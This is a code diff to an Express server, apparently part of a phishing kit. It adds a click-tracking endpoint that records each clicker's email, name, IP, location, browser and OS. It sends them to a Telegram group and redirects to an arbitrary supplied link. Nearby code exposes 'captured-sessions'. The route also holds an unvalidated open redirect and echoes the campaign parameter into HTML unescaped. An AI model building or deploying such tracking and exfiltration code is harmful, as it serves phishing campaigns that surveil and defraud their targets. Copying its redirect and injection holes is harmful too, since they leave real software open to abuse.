@@ -856,6 +856,130 @@ app.get('/health', (req, res) => {
   });
 });
 
+
+
+app.get('/track/click', async (req, res) => {
+  try {
+    // Get tracking parameters from query string
+    const {
+      email = 'unknown',
+      campaign = 'unknown',
+      link = '#',
+      template = 'unknown',
+      name = 'unknown'
+    } = req.query;
+
+    // Get client details
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    
+    // Parse user agent for basic info
+    const agent = useragent.parse(userAgent);
+    
+    // Get location from IP (if geoip is available)
+    let location = 'Unknown';
+    try {
+      const geo = geoip.lookup(ip);
+      if (geo) {
+        location = `${geo.city || 'Unknown'}, ${geo.country || 'Unknown'}`;
+      }
+    } catch (e) {
+      // Ignore geoip errors
+    }
+
+    // Current time
+    const clickTime = new Date().toLocaleString();
+
+    // Create a short token for reference
+    const token = crypto.randomBytes(4).toString('hex');
+
+    // Log the click
+    console.log(`\n🔗 LINK CLICKED [${token}]`);
+    console.log(`   Email: ${email}`);
+    console.log(`   Campaign: ${campaign}`);
+    console.log(`   Link: ${link}`);
+    console.log(`   IP: ${ip}`);
+    console.log(`   Time: ${clickTime}`);
+
+    // Send Telegram notification
+    if (bot && telegramGroupId) {
+      const message = 
+        `🔗 *Link Clicked!*\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `*Email:* \`${email}\`\n` +
+        `*Name:* ${name}\n` +
+        `*Campaign:* ${campaign}\n` +
+        `*Template:* ${template}\n` +
+        `*Link:* ${link}\n` +
+        `*IP:* \`${ip}\`\n` +
+        `*Location:* ${location}\n` +
+        `*Browser:* ${agent.toAgent() || 'Unknown'}\n` +
+        `*OS:* ${agent.os.toString() || 'Unknown'}\n` +
+        `*Time:* ${clickTime}\n` +
+        `*Token:* \`${token}\``;
+
+      await bot.sendMessage(telegramGroupId, message, {
+        parse_mode: 'Markdown',
+        disable_web_page_preview: true
+      });
+      
+      console.log(`✅ Telegram notification sent for click ${token}`);
+    }
+
+    // Redirect to the actual link
+    if (link && link !== '#') {
+      return res.redirect(302, link);
+    } else {
+      // If no link provided, show a simple thank you page
+      return res.send(`
+        <html>
+          <head>
+            <title>Link Tracked</title>
+            <style>
+              body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
+              .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }
+              h2 { color: #333; }
+              p { color: #666; }
+            </style>
+          </head>
+          <body>
+            <div class="container">
+              <h2>✅ Click Tracked</h2>
+              <p>Your click has been recorded.</p>
+              <p><small>Campaign: ${campaign}</small></p>
+            </div>
+          </body>
+        </html>
+      `);
+    }
+
+  } catch (error) {
+    console.error('❌ Error tracking click:', error);
+    
+    // Still try to redirect even if tracking fails
+    if (req.query.link && req.query.link !== '#') {
+      return res.redirect(302, req.query.link);
+    }
+    
+    res.status(500).send('Error tracking click');
+  }
+});
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 // ============= DEBUG ENDPOINTS =============
 app.get('/captured-sessions', (req, res) => {
   const sessions = Array.from(capturedData.entries()).map(([id, data]) => ({
